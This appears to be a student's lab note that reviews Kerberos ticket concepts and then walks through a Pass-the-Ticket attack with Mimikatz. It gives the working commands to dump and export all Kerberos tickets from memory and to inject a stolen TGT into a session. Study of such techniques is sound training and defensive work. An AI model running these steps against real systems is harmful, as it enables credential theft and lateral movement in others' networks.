# Kerberos Protocol Refresher
The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

1) The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
2) The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) Attack from mimikatz
We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:
1) Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
2) Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension `.kirbi`, which contain the tickets.

**Mimikatz:**
```bash
privilege::debug
```
If response `Privilege '20' OK` then it means we have administrator rights.
```bash
sekurlsa::tickets /export
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/bb0b055d-a88c-4df9-b509-c9575cf1f1c9)
<br>
The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: [ randomvalue ]-username@service-domain.local.kirbi.

## Using tickets from mimikatz

We use exact same directory which tickets located.
We will launch mimkatz.exe and check privilege by `privilege::debug`
And then final command:
```bash
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/6ae5912e-a38d-48da-a0c9-c4c2911b9fbf)

```
Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.
```
